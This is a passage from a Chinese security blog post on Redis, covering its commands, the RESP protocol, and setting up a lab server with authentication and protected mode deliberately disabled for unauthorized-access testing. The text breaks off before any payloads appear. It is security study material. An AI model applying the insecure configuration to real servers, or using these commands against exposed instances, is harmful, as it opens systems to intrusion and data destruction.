@@ -1,0 +1,1484 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Ko1sh1">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/10/02/blog_redis安全/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Redis 相关漏洞与payload">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis 安全">
+<meta property="og:url" content="http://example.com/2023/10/02/blog_Redis%E5%AE%89%E5%85%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Redis 相关漏洞与payload">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/blog/1893076-20210227142812076-133463281.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120155129694.png">
+<meta property="og:image" content="http://example.com/images/blog/20190713085931-794d2d5e-a509-1-17057593958178.png">
+<meta property="og:image" content="http://example.com/images/blog/20190713090053-a9d401f0-a509-1-170575940818512.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120154220788.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120154454909.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120155730136.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120155804353.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120160329810.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120160955642.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120161654223.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120162328658.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120162418179.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240120192456256.png">
+<meta property="og:image" content="http://example.com/images/blog/image-20240121130241839.png">
+<meta property="article:published_time" content="2023-10-02T11:25:48.000Z">
+<meta property="article:modified_time" content="2024-05-30T13:52:42.310Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/blog/1893076-20210227142812076-133463281.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/avatar.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/avatar.jpg">
+    <meta name="theme-color" content="#FFA07A">
+    <link rel="shortcut icon" href="/images/avatar.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Redis 安全 -
+        
+        Ko1sh1&#39;s Blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+        
+            
+    
+            
+    
+            
+                
+                    <style> .home-banner-container .content div:nth-child(2) { justify-content: center !important;  } .home-banner-container .content div:nth-child(2) div:first-child { display: none !important; } </style>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/jquery.min.js'></script>
+                
+    
+            
+                
+                    <script data-swup-reload-script src='/js/custom/text.js'></script>
+                
+    
+            
+                
+                    <link rel='stylesheet' href='/css/mouse.css'>
+                
+    
+
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+    
+        <link href="/fonts/fonts.css" rel="stylesheet">
+    
+
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#FFA07A","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"english":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":false,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":false,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/b.jpg","dark":"/images/b.jpg"},"title":"Ko1sh1's Blog","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#FF7569","dark":"#FF7569"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"genshinFont","url":"/fonts/fonts.css"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Ko1sh1","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null,"qq":"/images/qq.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"雨に濡れた空気","artist":"春野杉卉","url":"/musics/雨に濡れた空気.mp3","cover":"/images/雨に濡れた空気.jpg"},{"name":"悋気","artist":"iwamizu","url":"/musics/悋気.mp3","cover":"/images/悋気.jpg"},{"name":"天空之城","artist":"StudioEIM","url":"/musics/天空之城.mp3","cover":"/images/天空之城.jpg"},{"name":"星茶会","artist":"灰澈","url":"/musics/星茶会.mp3","cover":"/images/星茶会.jpg"},{"name":"Talking to the Moon","artist":"MT1990","url":"/musics/Talking to the Moon.mp3","cover":"/images/Talking to the Moon.jpg"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.1","navbar":{"auto_hide":true,"color":{"left":"#87CEEB","right":"#FFB6C1","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/links/"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"Photos":{"path":"/masonry","icon":"fa-regular fa-image"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/2/5 17:00:00"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container px-6 md:px-12">
+
+    <div class="navbar-content ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Ko1sh1&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories"
+                                        >
+                                    <i class="fa-regular fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    关于
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/links/">
+                                                    师傅们
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-regular fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                关于
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/links/">师傅们</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/masonry"
+                        >
+                            <span>Photos</span>
+                            <i class="fa-regular fa-image fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">10</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">9</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    
+    
+        <script src="/js/custom/love.min.js"></script>
+    
+
+
+<div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/blog9.jpg" alt="Redis 安全" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">Redis 安全</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/avatar.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Ko1sh1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-02 19:25:48</span>
+        <span class="mobile">2023-10-02 19:25:48</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-05-30 21:52:42</span>
+            <span class="mobile">2024-05-30 21:52:42</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/">组件漏洞</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Redis/">Redis</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>9.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>41 分钟</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="1-Redis是什么"><a href="#1-Redis是什么" class="headerlink" title="1.Redis是什么"></a>1.Redis是什么</h2><p>REmote DIctionary Server(Redis) 是一个由Salvatore Sanfilippo写的key-value存储系统。</p>
+<p>Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p>
+<p>它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。</p>
+<p><strong>Redis默认端口为6379</strong></p>
+<h2 id="2-Redis的命令"><a href="#2-Redis的命令" class="headerlink" title="2.Redis的命令"></a>2.Redis的命令</h2><h3 id="连接命令"><a href="#连接命令" class="headerlink" title="连接命令"></a>连接命令</h3><p> 本地连接：<code>redis-cli</code>（本地连接后，若存在密码使用AUTH pass进行验证）</p>
+<p> 远程连接：<code>redis-cli -h host -p port [-a passwd]</code>（参数a可选项，如果是没有密码的则不需要）</p>
+<h3 id="键操作"><a href="#键操作" class="headerlink" title="键操作"></a>键操作</h3><p> 设置键值对：set 键名 键值（例如：set atao xxx–&gt;写入一个键名为atao、键值为xxx的内容，执行成功返回OK）</p>
+<p> 取出键值对：get 键名（例如：get atao–&gt;取出键名为atao的键的键值，返回键中的键值）</p>
+<p> 删除键值对：del 键名（例如：del atao–&gt;删除键名为atao的键，如果键被删除返回(integer)1，否则将输出(integer)0）</p>
+<p> 清空所有数据库命令：flushall（删除所有数据库里面的所有数据，是所有数据库，不仅仅是当前数据库，且此命令永远不会出现失败）</p>
+<p> 同步数据到磁盘上：save（以RDB文件的方式保存所有数据的快照，命令执行成功返回OK）</p>
+<h3 id="配置操作"><a href="#配置操作" class="headerlink" title="配置操作"></a>配置操作</h3><p>Redis配置文件名为redis.conf（Windows下名为redis.windows.conf），可以使用CONFIG命令进行查看。</p>
+<p>设置配置文件：config set 配置项 路径（配置项如:dir或dbfilename，二者分别是指定本地数据库存放目录和指定本地数据库文件名，配置被正确设置时返回OK，否则将返回错误）</p>
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>常见命令如下：</p>
+<ul>
+<li>查看信息：info</li>
+<li>删除所有数据库内容：flushall</li>
+<li>刷新数据库：flushdb</li>
+<li>查看所有键：keys *，使用select num可以查看键值数据</li>
+<li>设置变量：set aaa “mi1k7ea”</li>
+<li>查看变量值：get aaa</li>
+<li>查看备份文件路径：config get dir</li>
+<li>设置备份文件路径：config set dir dirpath</li>
+<li>查看备份文件名：config get dbfilename</li>
+<li>设置备份文件名：config set dbfilename filename</li>
+<li>保存备份文件：save</li>
+</ul>
+<h2 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h2><h3 id="Redis安装过程"><a href="#Redis安装过程" class="headerlink" title="Redis安装过程"></a>Redis安装过程</h3><ul>
+<li><p>下载安装包：<a class="link"   target="_blank" rel="noopener" href="http://download.redis.io/releases/" >http://download.redis.io/releases/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</li>
+<li><p>解压 <code>tar -zxvf redis-x.x.x.tar.gz</code></p>
+</li>
+<li><p>进入解压后的文件夹，执行 <code>make</code> 命令</p>
+</li>
+<li><p>修改 redis.conf 文件</p>
+<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1893076/202102/1893076-20210227142812076-133463281.png"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/1893076-20210227142812076-133463281.png"
+                      alt="img"
+                ></a></p>
+<p>高版本下还需要将这个值设置为 yes ，否则会出现如下报错</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(error) ERR CONFIG SET failed (possibly related to argument ‘dir’) - can’t set protected config</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240120155129694.png"
+                      alt="image-20240120155129694"
+                ></p>
+<ul>
+<li>进入 <code>src</code> 目录，执行 <code>./redis-server ../redis.conf &amp;</code>，启动 Redis 并至于后台</li>
+</ul>
+<p>修改 redis.conf  配置文件方便测试未授权访问</p>
+<p><strong>未授权访问</strong></p>
+<p>在 <code>redis.conf</code> 的配置文件中，有两个关键的配置会造成 Redis 未授权访问</p>
+<ul>
+<li>bind x.x.x.x<br>配置允许登陆 redis 服务的 ip，默认是 127.0.0.1(本机登录)<br>如果设置成 0.0.0.0 就相当于将redis暴露在公网中，公网中的机器都可以进行登陆</li>
+<li>protected-mode<br>功能是自 redis 3.2 之后设置的保护模式，默认为 yes，其作用就是如果 redis 服务没有设置密码并且没有配置 bind 则会只允许 redis 服务本机进行连接。关闭保护模式，就会允许远程连接Redis服务</li>
+</ul>
+<p>接着在Windows下就能无需密码认证直接远程连接Redis了：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.13.128 -p 6379</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="捕捉Redis流量"><a href="#捕捉Redis流量" class="headerlink" title="捕捉Redis流量"></a>捕捉Redis流量</h3><p> 这里使用的是tcpdump抓取流量，（遇到了一个小坑，Kali上显示tcpdump为最新版，但是无命令，更新环境变量：export PATH&#x3D;”&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;root&#x2F;bin”后可以正常使用）抓取流量的命令为</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i lo -s 0 port 6379 -w redis.pcap</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+<h2 id="4-常用协议"><a href="#4-常用协议" class="headerlink" title="4.常用协议"></a>4.常用协议</h2><h3 id="Redis通信协议RESP"><a href="#Redis通信协议RESP" class="headerlink" title="Redis通信协议RESP"></a>Redis通信协议RESP</h3><p>Redis客户端使用称为<strong>RESP</strong>（Redis序列化协议）的协议与Redis服务器进行通信，后续构造 payload 时也需要转换成 RESP 协议的格式。</p>
+<div class="highlight-container" data-rel="Swift"><figure class="iseeu highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RESP在Redis中用作请求</span><span class="operator">-</span>响应协议的方式如下：</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 客户端将命令作为<span class="type">RESP大容量字符串数组发送到Redis服务器</span><span class="operator">。</span></span><br><span class="line"><span class="operator">-</span> 服务器根据命令实现以<span class="type">RESP类型之一进行回复</span><span class="operator">。</span></span><br><span class="line">在<span class="type">RESP中，某些数据的类型取决于第一个字节：</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于简单字符串，答复的第一个字节为<span class="string">&quot;+&quot;</span></span><br><span class="line">  	格式：<span class="operator">+</span>字符串</span><br><span class="line">  	注意：字符串不能包含<span class="type">CR或者LF（不允许换行）</span></span><br><span class="line">  	eg：<span class="string">&quot;+OK<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于错误，回复的第一个字节为<span class="string">&quot;-&quot;</span></span><br><span class="line">  	格式：<span class="operator">-</span>错误前缀 错误信息\r\n</span><br><span class="line">  	注意：错误信息不能包含<span class="type">CR或者LF（不允许换行），Errors与Simple</span> <span class="type">Strings相似，不同的是Errors会被当作异常看待</span></span><br><span class="line">  	eg：<span class="string">&quot;-Errors unknow command &#x27;foobar&#x27;<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于整数，答复的第一个字节为<span class="string">&quot;:&quot;</span></span><br><span class="line">  	格式：:数字\r\n</span><br><span class="line">  	eg：<span class="string">&quot;:10<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于批量字符串（大字符串类型<span class="type">Bulk</span> <span class="type">Strings，长度限制512M），答复的第一个字节为</span><span class="string">&quot;$&quot;</span></span><br><span class="line">  	格式：<span class="variable">$字符串的长度</span>\r\n字符串\r\n</span><br><span class="line">  	注意：字符串不能包含<span class="type">CR或者LF（不允许换行）</span></span><br><span class="line">  	eg：<span class="string">&quot;$7<span class="subst">\r</span><span class="subst">\n</span>payload<span class="subst">\r</span><span class="subst">\n</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> 对于数组，回复的第一个字节为<span class="string">&quot;*&quot;</span></span><br><span class="line">  	格式：<span class="operator">*</span>数组元素个数\r\n其他类型(结尾不需要\r\n)</span><br><span class="line">  	注意：只有元素个数后面的\r\n是属于该数组的，结尾的\r\n一般是元素的</span><br><span class="line">  	eg：<span class="string">&quot;*0<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——空数组</span><br><span class="line">  		<span class="string">&quot;*2<span class="subst">\r</span><span class="subst">\n</span>$1<span class="subst">\r</span><span class="subst">\n</span>A<span class="subst">\r</span><span class="subst">\n</span>$3<span class="subst">\r</span><span class="subst">\n</span>tao<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——数组包含<span class="number">2</span>个元素，分别为<span class="type">A和tao</span></span><br><span class="line">  		<span class="string">&quot;*-1<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>——<span class="type">Null数组</span></span><br><span class="line"></span><br><span class="line">通过上面所述的几种类型构造命令传给redis服务端，则服务端会返回相应的内容<span class="operator">。</span></span><br><span class="line">执行成功后服务器会返回 <span class="operator">+</span><span class="type">OK，这个是</span> redis 服务器对 redis 客户端的响应</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p>
+<p>RESP在Redis中用作请求 - 响应协议的方式如下：</p>
+<ol>
+<li>客户端将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器。</li>
+<li>服务器根据命令实现回复一种RESP类型。</li>
+</ol>
+<blockquote>
